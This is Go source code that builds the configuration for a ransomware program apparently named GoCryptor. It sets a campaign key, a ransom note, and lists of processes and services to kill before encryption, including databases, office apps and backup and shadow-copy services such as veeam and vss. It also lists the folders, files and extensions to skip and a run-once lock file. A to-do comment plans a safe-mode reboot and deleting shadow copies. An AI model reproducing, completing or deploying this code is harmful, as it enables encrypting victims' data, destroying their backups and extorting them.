package main

import (
	"fmt"
	"math/rand"
	"time"
)

func main() {
	rand.Seed(time.Now().UnixNano())
	populateConfig()
}

func populateConfig() {
	config := Configuration{}

	version := []int{1, 0}
	config.setVersion(version)

	campaignKey := [32]byte{121, 255, 160, 49, 104, 254, 213, 18, 97, 27, 75, 192, 146, 104, 251, 41, 37, 72, 43, 246, 200, 134, 120, 74, 61, 175, 222, 154, 182, 134, 224, 94}
	config.setCampaignKey(campaignKey)

	largeFileEncryptFlag := false
	privilegeEscalationFlag := false
	networkEncryptFlag := false
	terminateProcessFlag := true
	deleteServiceFlag := true
	wallpaperFlag := true
	runOnceFlag := true
	serverCommunicationFlag := false
	config.setFlags([]bool{largeFileEncryptFlag, privilegeEscalationFlag, networkEncryptFlag,
		terminateProcessFlag, deleteServiceFlag, wallpaperFlag, runOnceFlag, serverCommunicationFlag})

	processHashList := stringListToHashList([]string{"thebat", "msaccess", "firefox", "notepad", "ocssd", "encsvc", "dbeng50", "sql", "agntsvc", "isqlplussvc", "xfssvccon", "tbirdconfig", "wordpad", "dbsnmp", "infopath", "powerpnt", "oracle", "ocautoupds", "visio", "excel", "winword", "synctime", "steam", "thunderbird", "sqbcoreservice", "mspub", "ocomm", "onenote", "mydesktopqos", "mydesktopservice", "outlook"})
	config.setProcessHashList(processHashList)

	serviceHashList := stringListToHashList([]string{"mepocs", "memtas", "veeam", "svc$", "backup", "sql", "vss", "msexchange"})
	config.setServiceHashList(serviceHashList)

	remoteServerURLList := [][]byte{[]byte("https://chuongdong.com"), []byte("http://chuongdong.com")}
	config.setRemoteServerURLList(remoteServerURLList)

	ransomNoteContent, err := compress([]byte("   _____        _____                  _             \n  / ____|      / ____|                | |            \n | |  __  ___ | |     _ __ _   _ _ __ | |_ ___  _ __ \n | | |_ |/ _ \\| |    | '__| | | | '_ \\| __/ _ \\| '__|\n | |__| | (_) | |____| |  | |_| | |_) | || (_) | |   \n  \\_____|\\___/ \\_____|_|   \\__, | .__/ \\__\\___/|_|   \n                            __/ | |                  \n                           |___/|_|                  --> Your ID: %s\n--> Your key: %x\n"))

	if err != nil {
		fmt.Println("Can't compress", err.Error())
		ransomNoteContent = []byte("   _____        _____                  _             \n  / ____|      / ____|                | |            \n | |  __  ___ | |     _ __ _   _ _ __ | |_ ___  _ __ \n | | |_ |/ _ \\| |    | '__| | | | '_ \\| __/ _ \\| '__|\n | |__| | (_) | |____| |  | |_| | |_) | || (_) | |   \n  \\_____|\\___/ \\_____|_|   \\__, | .__/ \\__\\___/|_|   \n                            __/ | |                  \n                           |___/|_|                  --> Your ID: %s\n--> Your key: %x\n")
	}
	config.setRansomNoteContent(ransomNoteContent)
	config.setRansomNoteContentHash(bufferHashing(config.ransomNoteContent))

	runOnceString, err := compress([]byte("g0_l4nG_1S_FuN_i5nT_1T.lock"))
	if err != nil {
		fmt.Println("Can't compress", err.Error())
		runOnceString = []byte("g0_l4nG_1S_FuN_i5nT_1T.lock")
	}
	config.setRunOnceString(runOnceString)

	fileHashList := stringListToHashList([]string{"bootfont.bin", "thumbs.db", "ntldr", "ntuser.dat", "iconcache.db", "autorun.inf", "ntuser.ini", "bootsect.bak", "boot.ini", "ntuser.dat.log", "desktop.ini"})
	config.setFileHashList(fileHashList)

	folderHashList := stringListToHashList([]string{"program files (x86)", "$windows.~ws", "msocache", "boot", "program files", "application data", "tor browser", "mozilla", "intel", "programdata", "default", "appdata", "all users", "$windows.~bt", "google", "windows", "$recycle.bin", "windows.old", "config.msi", "public", "perflogs", "system volume information"})
	config.setFolderHashList(folderHashList)

	extensionHashList := stringListToHashList([]string{"cur", "diagcab", "cab", "idx", "diagcfg", "hlp", "theme", "rtp", "ldf", "msp", "mod", "drv", "lock", "ico", "lnk", "icns", "wpx", "shs", "icl", "msc", "diagpkg", "msu", "adv", "pdb", "mpa", "msstyles", "scr", "key", "dll", "nls", "cmd", "hta", "ocx", "sys", "ics", "ani", "cpl", "deskthemepack", "exe", "386", "themepack", "ps1", "nomedia", "com", "spl", "rom", "bat", "prf", "bin", "msi"})
	config.setExtensionHashList(extensionHashList)

	fmt.Println(config.toBytes())
}

func stringListToHashList(list []string) []uint32 {
	result := []uint32{}

	for _, each := range list {
		result = append(result, bufferHashing([]byte(each)))
	}
	return result
}

// Things to do:
// - Command line arguments
// - Config Parsing
// Pre-Encryption:
// - Cryptographic Keys Setup
// - Building Ransom Wallpaper Image
// - Safemood Reboot
// - Terminating Services and Processes through WMI
// - Terminating Services through Service Control Manager
// - Terminating Processes
// - Deleting Shadow Copies
